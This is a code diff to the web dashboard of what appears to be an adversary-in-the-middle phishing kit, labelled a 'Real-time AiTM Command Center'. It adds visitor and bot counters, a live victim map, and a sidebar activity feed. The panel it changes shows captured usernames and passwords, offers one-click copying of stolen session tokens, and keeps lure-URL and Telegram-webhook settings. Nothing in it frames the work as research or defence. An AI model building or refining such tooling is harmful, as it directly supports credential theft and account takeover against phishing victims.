@@ -21,6 +21,12 @@
     ::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
     ::-webkit-scrollbar-thumb:hover { background: #4b5563; }
     .leaflet-container { background: #111827; }
+    .glass-stat {
+        background: rgba(31, 41, 55, 0.7);
+        backdrop-filter: blur(10px);
+        -webkit-backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.05);
+    }
   </style>
 </head>
 <body class="h-full text-gray-100 font-sans antialiased" x-data="nexusfeed()" x-init="init()">
@@ -35,37 +41,47 @@
         <p class="text-xs text-gray-500 mt-1">Real-time AiTM Command Center</p>
       </div>
       
-      <div class="p-4 border-b border-gray-700 flex-grow flex flex-col">
-          <h2 class="text-sm font-bold mb-2 text-gray-400 uppercase tracking-wider">Live Victim Map</h2>
-          <div id="map" class="flex-grow rounded-lg mb-4 min-h-[300px] border border-gray-600"></div>
-          
-          <div class="grid grid-cols-2 gap-4 text-sm mb-4">
-            <div class="bg-green-900 p-3 rounded border border-green-700">
-                <div class="text-xs text-green-300 uppercase">Sessions</div>
-                <div class="text-2xl font-bold" x-text="stats.sessions">0</div>
-            </div>
-            <div class="bg-yellow-900 p-3 rounded border border-yellow-700">
-                <div class="text-xs text-yellow-300 uppercase">Credentials</div>
-                <div class="text-2xl font-bold" x-text="stats.creds">0</div>
-            </div>
+      <!-- Mini Live Feed (Sidebar) -->
+      <div class="flex-grow overflow-y-auto p-4 border-b border-gray-700 cursor-pointer hover:bg-gray-750 transition-colors" @click="tab = 'visitors'" title="Click to view full log">
+          <h2 class="text-xs font-bold mb-3 text-gray-400 uppercase tracking-wider flex justify-between items-center">
+              Live Activity
+              <span class="text-[10px] bg-blue-900/50 text-blue-300 px-1 rounded">View All</span>
+          </h2>
+          <div class="space-y-3">
+              <template x-for="event in events.slice(0, 10)" :key="event.id">
+                  <div class="text-xs border-l-2 pl-2 py-1" :class="borderClass(event)">
+                      <div class="flex justify-between text-gray-400">
+                          <span x-text="formatTimeShort(event.timestamp)"></span>
+                          <span x-text="event.phishlet"></span>
+                      </div>
+                      <div class="font-medium text-white truncate" x-text="event.username || event.ip"></div>
+                      <div class="text-[10px] text-gray-500" x-text="event.type"></div>
+                  </div>
+              </template>
+              <div x-show="events.length === 0" class="text-center text-gray-600 py-4 text-xs">Waiting for activity...</div>
           </div>
       </div>
       
-      <nav class="p-4 space-y-1 overflow-y-auto flex-shrink-0">
-        <a href="#" @click.prevent="tab = 'dashboard'" :class="tab === 'dashboard' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md">
-            <span class="mr-3 text-lg">📊</span> Dashboard
+      <nav class="p-4 space-y-1 flex-shrink-0">
+        <a href="#" @click.prevent="tab = 'dashboard'" :class="tab === 'dashboard' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z" /></svg>
+            Dashboard
         </a>
-        <a href="#" @click.prevent="loadVisitors(); tab = 'visitors'" :class="tab === 'visitors' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md">
-            <span class="mr-3 text-lg">👀</span> Visitors
+        <a href="#" @click.prevent="loadVisitors(); tab = 'visitors'" :class="tab === 'visitors' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
+            Visitors
         </a>
-        <a href="#" @click.prevent="loadCredentials(); tab = 'credentials'" :class="tab === 'credentials' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md">
-            <span class="mr-3 text-lg">🔑</span> Credentials
+        <a href="#" @click.prevent="loadCredentials(); tab = 'credentials'" :class="tab === 'credentials' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" /></svg>
+            Credentials
         </a>
-        <a href="#" @click.prevent="loadCampaigns(); tab = 'campaigns'" :class="tab === 'campaigns' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md">
-            <span class="mr-3 text-lg">🚀</span> Campaigns
+        <a href="#" @click.prevent="loadCampaigns(); tab = 'campaigns'" :class="tab === 'campaigns' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
+            Campaigns
         </a>
-        <a href="#" @click.prevent="loadSettings(); tab = 'settings'" :class="tab === 'settings' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md">
-            <span class="mr-3 text-lg">⚙️</span> Settings
+        <a href="#" @click.prevent="loadSettings(); tab = 'settings'" :class="tab === 'settings' ? 'bg-gray-900 text-white' : 'text-gray-400 hover:bg-gray-700 hover:text-white'" class="group flex items-center px-2 py-2 text-sm font-medium rounded-md transition-colors">
+            <svg class="mr-3 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
+            Settings
         </a>
       </nav>
 
@@ -98,49 +114,80 @@
         
         <!-- Dashboard View -->
         <div x-show="tab === 'dashboard'" x-transition:enter="transition ease-out duration-200" x-transition:enter-start="opacity-0" x-transition:enter-end="opacity-100">
-            <div class="space-y-4 max-w-4xl mx-auto">
-                <h3 class="text-sm font-medium text-gray-400 uppercase tracking-wider mb-2">Live Activity Feed</h3>
-                
-                <template x-for="event in events" :key="event.id">
-                    <div :class="cardClass(event)" class="p-4 rounded-lg shadow-lg animate-pulse-once transition-all duration-300 border-l-4 bg-gray-800">
-                        <div class="flex justify-between items-start">
-                            <div class="flex items-center gap-3">
-                                <span class="text-2xl" x-text="icon(event)"></span>
-                                <div>
-                                    <div class="font-bold text-white" x-text="event.username || event.ip || 'Anonymous'"></div>
-                                    <div class="text-xs text-gray-400 font-mono" x-text="formatTime(event.timestamp)"></div>
-                                </div>
-                            </div>
-                            <span class="text-xs font-bold px-2 py-1 rounded bg-gray-700 text-gray-300" x-text="event.phishlet || 'Unknown'"></span>
-                        </div>
-                        
-                        <div x-show="event.message && event.type !== 'session' && event.type !== 'credentials'" class="mt-2 text-gray-300 text-sm" x-html="event.message"></div>
-
-                        <div x-show="event.type === 'credentials'" class="mt-3 bg-black/30 p-2 rounded border border-yellow-900/30">
-                            <div class="grid grid-cols-1 gap-1 font-mono text-sm">
-                                <div class="truncate"><span class="text-gray-500">U:</span> <span class="text-white" x-text="event.username"></span></div>
-                                <div class="truncate"><span class="text-gray-500">P:</span> <span class="text-white" x-text="event.password"></span></div>
-                            </div>
-                        </div>
-
-                        <div x-show="event.type === 'session'" class="mt-3">
-                            <div class="flex gap-2">
-                                <button @click="copyTokens(event.tokens)" class="flex-1 bg-gray-700 hover:bg-gray-600 text-xs py-1 rounded">Copy Tokens</button>
-                                <button @click="viewDetails(event)" class="flex-1 bg-purple-900/50 hover:bg-purple-900 text-purple-200 text-xs py-1 rounded border border-purple-700">View Details</button>
-                            </div>
-                        </div>
-                    </div>
-                </template>
-                
-                <div x-show="events.length === 0" class="text-center text-gray-600 py-10">
-                    <p>Waiting for activity...</p>
+            
+            <!-- Stats Row -->
+            <div class="grid grid-cols-1 md:grid-cols-5 gap-4 mb-6">
+                <div class="glass-stat p-4 rounded-lg">
+                    <div class="text-xs text-gray-400 uppercase tracking-wider mb-1">Real Visitors</div>
+                    <div class="text-2xl font-bold text-white" x-text="stats.real">0</div>
+                </div>
+                <div class="glass-stat p-4 rounded-lg">
+                    <div class="text-xs text-gray-400 uppercase tracking-wider mb-1">Active Sessions</div>
+                    <div class="text-2xl font-bold text-white" x-text="stats.sessions">0</div>
+                </div>
+                <div class="glass-stat p-4 rounded-lg">
+                    <div class="text-xs text-gray-400 uppercase tracking-wider mb-1">Credentials</div>
+                    <div class="text-2xl font-bold text-white" x-text="stats.creds">0</div>
+                </div>
+                <div class="glass-stat p-4 rounded-lg">
+                    <div class="text-xs text-gray-400 uppercase tracking-wider mb-1">Total Visitors</div>
+                    <div class="text-2xl font-bold text-white" x-text="stats.total">0</div>
+                </div>
+                <div class="glass-stat p-4 rounded-lg">
+                    <div class="text-xs text-gray-400 uppercase tracking-wider mb-1">Bots</div>
+                    <div class="text-2xl font-bold text-gray-500" x-text="stats.bots">0</div>
                 </div>
             </div>
+
+            <!-- Map -->
+            <div class="bg-gray-800 rounded-lg border border-gray-700 p-1 mb-6 h-[500px] relative">
+                <div id="map" class="w-full h-full rounded bg-gray-900"></div>
+                <div class="absolute top-4 left-4 bg-black/50 backdrop-blur px-3 py-1 rounded text-xs text-white z-[1000]">Live Victim Map</div>
+            </div>
+
+            <!-- Real Time Events Summary -->
+            <div class="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
+                <div class="p-4 border-b border-gray-700">
+                    <h3 class="text-sm font-bold text-white uppercase tracking-wider">Real Time Events</h3>
+                </div>
+                <div class="overflow-x-auto">
+                    <table class="min-w-full divide-y divide-gray-700">
+                        <thead class="bg-gray-900">
+                            <tr>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Event</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Target</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Location</th>
+                                <th class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody class="bg-gray-800 divide-y divide-gray-700">
+                            <template x-for="event in events.slice(0, 5)" :key="event.id">
+                                <tr class="hover:bg-gray-750 transition-colors">
+                                    <td class="px-6 py-4 whitespace-nowrap">
+                                        <div class="flex items-center">
+                                            <span class="text-lg mr-2" x-text="icon(event)"></span>
+                                            <span class="text-sm font-medium text-white" x-text="event.type.toUpperCase()"></span>
+                                        </div>
+                                    </td>
+                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300" x-text="event.username || event.ip"></td>
+                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-400" x-text="event.geo ? event.geo.country : 'Unknown'"></td>
+                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500 font-mono" x-text="formatTime(event.timestamp)"></td>
+                                </tr>
+                            </template>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
         </div>
 
         <!-- Visitors View -->
         <div x-show="tab === 'visitors'" x-cloak>
             <div class="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
+                <div class="p-4 border-b border-gray-700 flex justify-between items-center">
+                    <h3 class="text-lg font-medium text-white">All Visitors</h3>
+                    <button @click="loadVisitors()" class="text-sm text-blue-400 hover:text-blue-300">Refresh</button>
+                </div>
                 <table class="min-w-full divide-y divide-gray-700">
                     <thead class="bg-gray-900">
                         <tr>
@@ -320,7 +367,8 @@
         whitelist: [],
         settings: { lure_url: 'Waiting for update...', telegram_webhook: '' },
         newWhitelistIP: '',
-        stats: {sessions:0, creds:0}, 
+        stats: {sessions:0, creds:0, real:0, bots:0, total:0}, 
+        uniqueIPs: new Set(),
         map: null,
         connected: false,
         muted: true,
@@ -392,6 +440,15 @@
         },
 
         updateStats(e) {
+          this.stats.total++;
+          if (e.type === 'bot') {
+              this.stats.bots++;
+          } else if (e.ip) {
+              if (!this.uniqueIPs.has(e.ip)) {
+                  this.uniqueIPs.add(e.ip);
+                  this.stats.real++;
+              }
+          }
           if (e.type === 'session') this.stats.sessions++;
           if (e.type === 'credentials') this.stats.creds++;
         },
@@ -432,7 +489,8 @@
                 this.events = [];
                 this.visitorData = [];
                 this.credentialData = [];
-                this.stats = {sessions:0, creds:0};
+                this.stats = {sessions:0, creds:0, real:0, bots:0, total:0};
+                this.uniqueIPs.clear();
             }
         },
 
@@ -440,16 +498,25 @@
         cardClass(e) { 
             if (e.type === 'session') return 'border-purple-500 bg-gradient-to-r from-purple-900/20 to-transparent';
             if (e.type === 'credentials') return 'border-yellow-500 bg-gradient-to-r from-yellow-900/20 to-transparent';
+            if (e.type === 'bot') return 'border-red-500 bg-gradient-to-r from-red-900/20 to-transparent';
             return 'border-gray-600'; 
+        },
+        borderClass(e) {
+            if (e.type === 'session') return 'border-purple-500';
+            if (e.type === 'credentials') return 'border-yellow-500';
+            if (e.type === 'bot') return 'border-red-500';
+            return 'border-gray-600';
         },
         badgeClass(e) { return e.score >= 50 ? 'bg-red-600 text-white' : 'bg-green-600 text-white'; },
         icon(e) { 
             if (e.type === 'session') return '🍪'; 
             if (e.type === 'credentials') return '🔑'; 
             if (e.type === 'click') return '🖱️';
+            if (e.type === 'bot') return '🤖';
             return '👁️'; 
         },
         formatTime(t) { return t ? new Date(t).toLocaleString() : ''; },
+        formatTimeShort(t) { return t ? new Date(t).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : ''; },
         copyTokens(tokens) { navigator.clipboard.writeText(tokens).then(() => alert("Copied!")); },
         viewDetails(e) { alert(JSON.stringify(e, null, 2)); }
       }
